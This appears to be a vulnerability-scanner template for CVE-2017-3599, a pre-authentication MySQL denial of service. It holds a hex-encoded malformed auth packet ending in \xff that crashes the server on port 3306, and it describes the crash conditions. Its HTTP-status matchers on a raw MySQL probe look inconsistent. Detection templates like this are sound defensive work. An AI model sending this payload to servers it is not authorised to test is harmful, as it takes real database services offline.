id: CVE-2017-3599

info:
  name: Pre-Auth MySQL Remote DoS (Integer Overflow)
  author: dwisiswant0
  severity: high
  reference: |
    - https://github.com/SECFORCE/CVE-2017-3599/blob/master/cve-2017-3599_poc.py
    - https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/
  description: |
    Conditions to crash:
    1 - packet_auth must start with \xff or \xfe
    2 - packet_auth must be shorter than 8 chars

    The expected value is the password, which could be of two different formats
    (null terminated or length encoded) depending on the client functionality.
  tags: cve,cve2017,mysql,dos,overflow

network:
  - inputs:
      - data: "{{hex_decode('2600000185a2bf0100000001210000000000000000000000000000000000000000000000')}}test{{hex_decode('ff')}}"
        read: 1024
    host:
      - "{{Hostname}}:3306"
    read-size: 1024
    matchers:
      - type: status
        status:
          - 500
          - 501
          - 502
          - 503
          - 504
        condition: or
